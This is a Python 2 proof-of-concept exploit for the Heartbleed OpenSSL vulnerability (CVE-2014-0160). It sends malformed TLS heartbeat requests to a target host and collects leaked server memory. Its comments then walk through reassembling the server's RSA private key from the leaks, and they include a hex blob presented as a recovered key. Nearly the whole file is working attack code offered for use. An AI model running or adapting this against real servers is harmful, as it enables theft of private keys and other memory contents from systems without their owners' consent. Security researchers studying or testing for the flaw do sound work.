#!/usr/bin/env python2
"""
Author: takeshix <takeshix@adversec.com>
PoC code for CVE-2014-0160. Original PoC by Jared Stafford (jspenguin@jspenguin.org).

Supportes all versions of TLS and has STARTTLS support for SMTP,POP3,IMAP,FTP and XMPP.
"""

import sys,struct,socket
from argparse import ArgumentParser
import pprint
import pickle

tls_versions = {0x01:'TLSv1.0',0x02:'TLSv1.1',0x03:'TLSv1.2'}

def info(msg):
	print '[+] {}'.format(msg)

def error(msg):
	print '[-] {}'.format(msg)
	sys.exit(0)

def debug(msg):
	if opts.debug: print '[*] {}'.format(msg)

def parse_cl():
	global opts
	parser = ArgumentParser(description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
	parser.add_argument('host', help='IP or hostname of target system')
	parser.add_argument('-p', '--port', metavar='Port', type=int, default=443, help='TCP port to test (default: 443)')
	parser.add_argument('-f', '--file', metavar='File', help='Dump leaked memory into outfile')
	parser.add_argument('-s', '--starttls', metavar='smtp|pop3|imap|ftp|xmpp', default=False, help='Check STARTTLS')
	parser.add_argument('-d', '--debug', action='store_true', default=False, help='Enable debug output')
	opts = parser.parse_args()

def hex2bin(arr):
	return ''.join('{:02x}'.format(x) for x in arr).decode('hex')

def build_client_hello(tls_ver):
	client_hello = [
			# TLS header ( 5 bytes)
			0x16,			   # Content type (0x16 for handshake)
			0x03, tls_ver,		 # TLS Version
			0x00, 0xdc,		 # Length
			# Handshake header
			0x01,			   # Type (0x01 for ClientHello)
			0x00, 0x00, 0xd8,   # Length
			0x03, tls_ver,		 # TLS Version
			# Random (32 byte)
			0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
			0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
			0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
			0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
			0x00,			   # Session ID length
			0x00, 0x66,		 # Cipher suites length
			# Cipher suites (51 suites)
			0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
			0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
			0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
			0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
			0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
			0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
			0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
			0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
			0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
			0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
			0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
			0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
			0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
			0x01,			   # Compression methods length
			0x00,			   # Compression method (0x00 for NULL)
			0x00, 0x49,		 # Extensions length
			# Extension: ec_point_formats
			0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
			# Extension: elliptic_curves
			0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
			0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
			0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
			0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
			0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
			0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
			0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
			# Extension: SessionTicket TLS
			0x00, 0x23, 0x00, 0x00,
			# Extension: Heartbeat
			0x00, 0x0f, 0x00, 0x01, 0x01
			]
	return client_hello

def build_heartbeat(tls_ver):
	heartbeat = [
			0x18,	   # Content Type (Heartbeat)
			0x03, tls_ver,  # TLS version
			0x00, 0x03,  # Length
			# Payload
			0x01,	   # Type (Request)
			0x40, 0x00  # Payload length
			] 
	return heartbeat

def hexdump(s, l):
	for b in xrange(0, len(s), l):
		lin = [c for c in s[b : b + l]]
		hxdat = ' '.join('%02X' % ord(c) for c in lin)
		pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
		print '  %04x: %-48s %s' % (b, hxdat, pdat)

def rcv_tls_record(s):
	try:
		tls_header = s.recv(5)
		if not tls_header:
			error('Unexpected EOF (header)')			
		typ,ver,length = struct.unpack('>BHH',tls_header)
		message = ''
		while len(message) != length:
			message += s.recv(length-len(message))
		if not message:
			error('Unexpected EOF (message)')
		debug('Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,))
		return typ,ver,message
	except Exception as e:
		error(e)

def socket_open(host, port):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
	except Exception as e:
		error(str(e))
	return s

def hello_server(s):
	supported = False
	for num,tlsver in tls_versions.items():
		info('Sending ClientHello for {}'.format(tlsver))
		s.send(hex2bin(build_client_hello(num)))
		info('Waiting for Server Hello...')
		while True:
			typ,ver,message = rcv_tls_record(s)
			if not typ:
				continue
			if typ is 22 and ord(message[0]) is 0x0E:
				supported = num
				break
		if supported: break

	if not supported:
		error('No TLS version is supported')
	return supported

def do_hb(s):
	s.send(hex2bin(build_heartbeat(True)))

	while True:
		typ,ver,message = rcv_tls_record(s)
		if not typ:
			error('No heartbeat response received, server likely not vulnerable')
		if typ is 24:
			if len(message) > 3:
				return message
			else:
				error('Server processed malformed heartbeat, but did not return any extra data.')
		elif typ is 21:
			error('Received alert')

def fetch_hbs(s):
	hbs = []
	for i in range(0,100):
		hb = ""
		while len(hb) != 16384:
			hb = do_hb(s)
		hbs.append(hb)
	return hbs

def common_length(a,b):
	i = 0
	while len(a)>i and len(b)>i and a[i] == b[i]:
		#print (i+1)
		i = i+1
	return i

def common_list(a,b,minlen):
	# Computes all common substrings
	a = list(a)
	b = list(b)
	i = 0
	common = []
	while i < len(a):
		ic = a[i]
		j = 0
		if i%100 == 0:
			print str(i)+" of "+str(len(a))
		while j < len(b): 
			jc = b[j]
			if ic != jc:
				j = j+1
				continue
			common_len = common_length(a[i:], b[j:])
			if common_len < minlen:
				j = j+common_len
				continue
			print "Appended: at "+str(i)+", "+str(j)+", len "+str(common_len)
			common.append([i, j, a[i:i+common_len]])
			j = j+common_len
		i = i+1
	return common

def save(arr):
	# Work reduction
	f = open('hb-progress.bin', 'w')
	pickle.dump(arr,f)
	f.close()

def restore():
	f = open('hb-progress.bin', 'r')
	arr = pickle.load(f)
	f.close()
	return arr

def reduce_common(l):
	newl = []
	prev = False
	for i in l:
		if prev != False and (prev[0]+1) == i[0] and (prev[1]+1) == i[1] and (len(prev[2])-1) == len(i[2]):
			#	print "Umm yeah"
			prev = i
			continue
		newl.append(i)
		prev = i
	return newl

def getbiggest(l):
	big = False
	for i in l:
		if big == False or len(big[2]) < len(i[2]):
			big = i
	return big

def thesearch(needle, hbs, offleft, offright):
	matches = []
	for i in hbs:
		off = i.find(needle)
		if off == -1:
			continue
		# Change these offsets as you see fit
		sub = i[off-offleft:off+offright]
		matches.append(sub.encode('hex'))
	#print matches
	print "Common strings across all heartbleed requests:"
	pp = pprint.PrettyPrinter()
	pp.pprint(sorted(matches))

def stage1():
	print "Stage 1 - do heartbleeds, find common string, and store result."
	parse_cl()

	s = socket_open(opts.host, opts.port)

	hello_server(s)
	hbs = fetch_hbs(s) # 100 pieces, this will never give up, it will rather infiniteloop..
	# Now, let's search for things common between 1 and 2, and demand minimum length of 50
	l = common_list(hbs[0], hbs[1], 50)
	l = reduce_common(l)
	m = getbiggest(l)
	# Store
	save([hbs, m])
	print "End of stage 1"

def stage1_results():
	hbs,m=restore()
	print "Common bytes found in stage1:"
	print [''.join(m[2]).encode("hex")]

def stage2(needle, left, right):
	hbs,m=restore()
	thesearch(needle,hbs,left,right)



if __name__ == '__main__':
	# Stage 1 - do heartbleeds and store results in a file
	stage1()
	
	# You can use this to print the result from stage 1:
	stage1_results()

	# A litle explanation:
	# The results from stage 1 are some bytes likely in the middle of the certificate.
	# stage 2 will search for a string and print excercepts from all the requests where the bytes are present,
        #  as well as a few surrounding bytes.
	# That way, you can see what the heartbleed packets have in common and use this to merge your key together.

	# Stage 2, select ~ 5 bytes from your common ones and dump
	# This stage will show you more and more of the key, so write everything you see to a separate file, and use stage2() to get data left and right of your known bytes.
	#stage2("\x01\x00\x30\x0d\x06", 40, 5) # This prints out from 40 bytes to the left of the match to 5 bytes to the right. Increase them to get larger chunks of the key, saving some time.

        # Using stage2 to merge together the private key, we get something like this:
        #   0000308204be020100300d06092a864886f70d0101010500048204a8308204a4020100
        #   0282010100ebb64c07b30b8b9d1db65cf8f4eca0a6d31a089d05cd81d505e262d0259e285726d879ea5620fc553835f6dc
        #   55a9706370d4586420bc56c254ed2872d62609ade15c8624611236f70a9bd2d953cc376a819e7670c4dbd81a2118a5ee9b
        #   4153c453288b3876cecca6099b8dcc8b087c004930d86617b6eac5760e9f8f72030aafa661dbcde3106ba62bbec22db350
        #   c6e4985cd5e2b3c8a2cce38c7c48ead80072cf15ccee58c0f985c192c1777e810281804c6880165a0cb83e09bbe2f66603
        #   0000


	# Last stage: Remove two zero bytes from beginning and end, and put it here:
	#message = "308204be020100300d06092a864886f70d0101010500048204a8308204a40201000282010100ebb64c07b30b8b9d1db65cf8f4eca0a6d31a089d05cd81d505e262d0259e285726d879ea5620fc553835f6dcae5340da415eb8c8ec735d4624023d92824fb79da7826dfb40f9d73def151a70a2fc7377265a9e554b299222d49e7cfc395b7bb589916b2fadfdc934d15b782558fce6a548b12e37a454f1dfb5f16bf11d709fb966830efdd4d6113a580b1761e95e597d5010f2d517ab1ef5151759d5c4678473091dd47280700142270a484f2278c68f8e3126b69be81e23f8f9cdc8aba4116e97679a4e34ffcf776441368c67d1f13db95b8777052b0302826f0e798e182b4cab6e846a217294b0003ac219b4c1cf7671ade809566a1de9b3f1f1dd2636ad9b02030100010282010100cd01f88e99c2e8e2f5fcae503975b5246366b92718ecec87025f2be22d55a9706370d4586420bc56c254ed2872d62609ade15c8624611236f70a9bd2d953cc376a819e7670c4dbd81a2118a5ee9bf33126429a8344a41b5dffdef885c6bd329369daf886b7a58b624cd46962d24ae3afcdd18c89087c7902419480756d4d8f1c5e0c461137f08c8fa429f4caa93e1ab3448b3d9e12bd4874649492ff07bef7a232b917656f8f423a38cebac647a1ae930583a5d41cb1dd9ba984a10941fe0057b86e9d1c9848cdf0c2f6f300263e42006c7d51279f8d8f4058f3836341ae97273b7c56b0651ec7070088cfe8b22d041530cfaac93b1bc21418154a1e4e5927c102818100fb23895b24848e94f17c8066b8abf76ad7e29c499ef40ed0542386c81b5aa952a70646ae95bc7760140720d2391d1c9af7cfd3a42a52b5416865c3f6e53569da4153c453288b3876cecca6099b8dcc8b087c004930d86617b6eac5760e9f8f72030aafa661dbcde3106ba62bbec22db350795a2c5ac6b35aeb543418a89c312f02818100f0465114d8c4772f0232a41c5cbe4b49567319195225b66b554d663ddda914e57bcd90930e92fa689e2a0cd768712871760c9f75be0d2749cb89add93c2444f6596d2b1eb3e66c6b1c96b4fbd7042fe9fe62498984e4ff163bb54f57c43b863bf1a284d5e0378b3d25c6c579c127f3f5b2696d3c2274c18b6583f83ec1faf75502818060df945c53f9ce062620a066ff55565b206b895ddcb2c80414709fcd10c0281079dd31e6a65bccb083093cdfdaa82020a6f6c3eccf6698046300de569e93bc0134b1db49389a7b6d58d818341c8cd619cb6c09b031e7477a5e54b15698cd73c7c6e4985cd5e2b3c8a2cce38c7c48ead80072cf15ccee58c0f985c192c1777e810281804c6880165a0cb83e09bbe2f66603d9db3b93a492a9cdf661d1a1a876da0b8fea9e6133ada03fdb43f3b0399f32c6716f0b745e2d4a3fd293a4176762a2be81f3b9627f08e77aca5591a4d76f12e470fc3f7a301a7c597a492eb9acbea357ae8b577f3030f779925ce2ab805704b6d8dcf45c9471401fd300aa4aba61f2bc057502818100ac3e7826db9698d17d1772405e7188c908646f8eabdf1ad60de433b1df9614df68f9e7d2d07aca2c469836c952a3a64ec6a5575303cb876e8e3f0ad7e77882e41bd83c7eae3ae17ce7dd8a608085dd8669c351085c0987a5716933d7aa804b43af53430c45bc45d450bb6c19270cb3fdfb8e7609083840f49a3bd77cad740537"
	#print len(message)/2
	# Let's put it into a binary file
	#bincoded = message.decode("hex")
	#f = open("privkey.bin","w")
	#f.write(bincoded)
	#f.close()
	# Continue to the next step
